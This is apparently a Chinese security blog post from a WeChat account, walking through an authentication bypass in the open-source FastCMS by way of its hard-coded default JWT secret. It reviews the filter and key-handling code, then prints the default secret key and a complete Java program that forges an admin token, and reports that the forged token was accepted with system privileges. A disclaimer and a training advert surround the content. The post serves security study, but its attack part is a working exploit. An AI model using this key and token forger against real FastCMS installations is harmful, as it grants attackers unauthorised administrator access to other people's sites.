---
title: 某CMS JWT鉴权绕过
url: https://mp.weixin.qq.com/s/38k0R5qtKowmPrJVesgpRA
source: Doonsec's feed
date: 2026-02-16
fetch_date: 2026-02-17T04:17:58.038527
---

# 某CMS JWT鉴权绕过

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/0ic45F94NibRugng5Y5aZKonSwQsEN2qx4zmZOhjpJjaBXef12Q4lA6yOOwwicsaPml3lBlAZ3MQJa58mE8j89elNvUg0KBNoHo4MjrG62ibxds/0?wx_fmt=jpeg)

# 某CMS JWT鉴权绕过

原创

暗月大徒弟
暗月大徒弟

moonsec

![]()

在小说阅读器中沉浸阅读

```
免责声明：本公众号所提供的文字和信息仅供学习和研究使用，不得用于任何非法用途。我们强烈谴责任何非法活动，并严格遵守法律法规。读者应该自觉遵守法律法规，不得利用本公众号所提供的信息从事任何违法活动。本公众号不对读者的任何违法行为承担任何责任。
```

### 暗月安全培训限时活动 需要培训联系微信

### 2026.2.14-2026.2.16

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/0ic45F94NibRvjCN44E9eD6pricA4Dw5aPRuUc0e1ial1vs6W8WSnZtceUoYgQRAjzF7wvVlwWtjYatuBxIFicDb4miaycmCfM2fvOagGrbQqbKts/640?wx_fmt=jpeg&from=appmsg)

### 1.jwt介绍

JWT，全称是 JSON Web Token，是一种用于身份验证和信息传递的轻量级令牌机制，常用于前后端分离的系统中。前面讲过详细 https://www.yuque.com/yuqueyonghuhva5jf/anyue2025/hl8alqkg3o3cykw8

### 2.实战利用

源码下载  https://gitee.com/xjd2020/fastcms

项目 导入 idea 修改application.yml 修改 数据库信息 创建数据库导入sql文件

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/0ic45F94NibRt1N24KAPJZ1d6ictS7aLDhPPp2XjXE3tJFqfPJJiaQr0G1zwbQEWg9l3ImOA1yfIS71adHnZKMqheGFcdE9XlNUPMdociaCYwo7o/640?wx_fmt=jpeg&from=appmsg) 编译 运行

![](https://mmbiz.qpic.cn/mmbiz_jpg/0ic45F94NibRuMxosVGCO6Xog7Xl6Dwic9Z843AHrQVlIFqyU44I1j0Uu9Tic55T5DHNu9xqetkto9X72ozF06PAKT5C092BeiaXzxfX2h9mDdbA/640?wx_fmt=jpeg&from=appmsg)

 访问本地  `http://192.168.10.201:8080/fastcms.html#/login`

![](https://mmbiz.qpic.cn/mmbiz_jpg/0ic45F94NibRsicnlVia4yoE6nwkLyicZalGEIwynTHX7uMILjme4ibrW89zbU1PqZG8LUSw7XVQ0hnmWYRic7ibHib8b1pGic06CPUEYLibib7H9wafg78/640?wx_fmt=jpeg&from=appmsg)

默认账号admin密码1

创建普通的用户moonsec 123456

![](https://mmbiz.qpic.cn/mmbiz_jpg/0ic45F94NibRuDBWRg2ZQxrO1t25aCzj90PK1E3jqBetNyxPhtcNSicrHpcpEyicqvjXIBAFbDWZzmK3xib0gYg8YjAhglzwQF1TgG9diaYNg3EF4/640?wx_fmt=jpeg&from=appmsg)

cookie https://jwt.io/  进行解码

解码得到用户的基础信息

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/0ic45F94NibRt4dtSDL6YZrTyCeMCqrI8J2icyudH8J1oXUAMqiaWxsnoRKtV2JQU5hia93fqKOYTRqAybIupWHfkfvMQF9MOyLSIHHeQSRU9HFU/640?wx_fmt=jpeg&from=appmsg)

### 3.鉴权分析

查看代码

src/main/java/com/fastcms/web/filter/JwtAuthTokenFilter.java

```
 @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
            throws IOException, ServletException {

        if (request.getRequestURI().startsWith(FastcmsConstants.API_PREFIX_MAPPING)
                || request.getRequestURI().startsWith(FastcmsConstants.PLUGIN_MAPPING)
        ) {
       // 从 Authorization获取jwt验证的token
            final String jwt = tokenManager.resolveToken(request);

            if (StringUtils.isNotBlank(jwt) && SecurityContextHolder.getContext().getAuthentication() == null) {
                try {
                    //验证token
                    tokenManager.validateToken(jwt);
                    //从token里面取值
                    Authentication authentication = this.tokenManager.getAuthentication(jwt);
                    SecurityContextHolder.getContext().setAuthentication(authentication);

                    filterChain.doFilter(request, response);
                } catch (ExpiredJwtException | SignatureException e) {
                    response.sendError(HttpServletResponse.SC_UNAUTHORIZED, e.getMessage());
                } catch (Exception e) {
                    e.printStackTrace();
                    response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "Server failed," + e.getMessage());
                }
            } else {
                response.sendError(HttpServletResponse.SC_UNAUTHORIZED, "not auth");
            }
        } else {
            filterChain.doFilter(request, response);
        }
```

校验通过之后取值。

com/fastcms/web/security/DelegatingTokenManager.java

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/0ic45F94NibRsNry8qHDKFUAduqiblHWbs2O7Alfwc6Ieuzu0R2AiaCBoeMz2yG4YoLib989tlwnY782l2bX9Wo9KNkRosSSymoGBHv9ctRd2rt0/640?wx_fmt=jpeg&from=appmsg)

那么在校验的时候肯定是采用硬编码 默认的secret-key

![](https://mmbiz.qpic.cn/mmbiz_jpg/0ic45F94NibRssSCLI1SNwq1z0HJ0Yx0kjN4Cl9Mhu6LMQJtZy52aRdOmtx7vWibLpNDuuaJ516oNj8LMlOvnAPf8k5BiakaaqNwRe8ExGP4zKY/640?wx_fmt=jpeg&from=appmsg)

默认的cms是不会更改这个值  那么就可以利用它验证jwt进行验证

```
SecretKey012345678901234567890123456789012345678901234567890123456789
```

访问 https://www.bejson.com/jwt/  输入secret-key 修改payload生成jwt

![](https://mmbiz.qpic.cn/mmbiz_jpg/0ic45F94NibRuibjvXl4ibibdyGuy9v3pQ4wkWL5PZq80NibXtTvFKnXKq1oqN5y1y25H05ylgYZeasYZNdrqaeHjTU0FRzJONBQccFqJrcV8TUicE/640?wx_fmt=jpeg&from=appmsg)

提交发现验证失败

![](https://mmbiz.qpic.cn/mmbiz_jpg/0ic45F94NibRuVGV3OJg235vJJL1knytqwm7QYHpEXpynavE5aMXteYUicf9XytgUZMT3UibWDSdpWd0ZUCnwiaUiam3s3PsibZib74ZUNxBbAF9D0Q/640?wx_fmt=jpeg&from=appmsg)

分析secret-key处理

com/fastcms/web/security/AuthConfigs.java

获取的 secretKey 还要base64 解码 但是 系统默认的并不存在编码

```
	public byte[] getSecretKeyBytes() {
		if (secretKeyBytes == null) {
			secretKeyBytes = Decoders.BASE64.decode(secretKey);
		}

		if (StringUtils.isNotBlank(ConfigUtils.getConfig(FastcmsConstants.JWT_SECRET))) {
			secretKeyBytes = Decoders.BASE64.decode(ConfigUtils.getConfig(FastcmsConstants.JWT_SECRET));
		}

		return secretKeyBytes;
	}
```

所以secretKeyBytes都是字节码 不好处理

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/0ic45F94NibRt3XobMRdzy9VYibFffSBdhqhgK1mJ4lED9DKRRAV99EXDibcO7gv5c9ic4OPVIMicB4dnJOzB5OLdO9tHm2ZNxOQTHxgWicGzkVcNI/640?wx_fmt=jpeg&from=appmsg)

### 4.jwt算法加密脚本

jwt加密就可以正常处理。

在pom.xml添加

```
<dependencies>
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-api</artifactId>
        <version>0.11.5</version> <!-- 看你用的版本 -->
    </dependency>
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-impl</artifactId>
        <version>0.11.5</version>
        <scope>runtime</scope>
    </dependency>
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-jackson</artifactId>
        <version>0.11.5</version>
        <scope>runtime</scope>
    </dependency>
</dependencies>
```

jwt token生成脚本

```
package org.example;

import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import io.jsonwebtoken.io.Decoders;
import io.jsonwebtoken.security.Keys;

import javax.crypto.SecretKey;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) {
        String secretKey="SecretKey012345678901234567890123456789012345678901234567890123456789";
        byte[] keyBytes = Decoders.BASE64.decode(secretKey);
        SecretKey key = Keys.hmacShaKeyFor(keyBytes);

        // payload 数据
        Map<String, Object> claims = new HashMap<>();
        claims.put("auth", "1");
        claims.put("userId", 1);
        claims.put("username", "admin");

        // 过期时间：你给的是 1744735095（Unix时间戳，秒）
        long expMillis = 1744735095L * 1000; // 转为毫秒
        Date exp = new Date(expMillis);

        // 生成 JWT
        String jwt = Jwts.builder()
                .setClaims(claims)
                .setExpiration(exp)
                .signWith(key, SignatureAlgorithm.HS256)
                .compact();

        System.out.println("生成的 JWT:");
        System.out.println(jwt);
    }

}
```

运行得到jwt token

![](https://mmbiz.qpic.cn/mmbiz_jpg/0ic45F94NibRt5veUtPNzMMO0Ls7ic7xISEDe3j6icDA1sr9g3MxfDvKGuPQjQNGwO8NDTO0rYhk2svbvgnQLemic3BU7YL4oXiapwD76VEaNvsyg/640?wx_fmt=jpeg&from=appmsg)

yakit提交验证正常 权限是system

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/0ic45F94NibRsZC9HMRAcGQabfBWmCoDL1J2PIXP3siaIoXs1XSqBFf0OWYNDgIfPmg3xjh31gOZssYrCfV6bbCaBrmfMnBsoySkG7IsprKvUk/640?wx_fmt=jpeg&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACib1YxUkAP5V2ldRHEzgqytbTxUd3Kao6poq8QU460nFxylPwDGauvzVCnWibRkAI7buhwHAl7GyKQ/0?wx_fmt=png)

moonsec

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACib1YxUkAP5V2ldRHEzgqytbTxUd3Kao6poq8QU460nFxylPwDGauvzVCnWibRkAI7buhwHAl7GyKQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过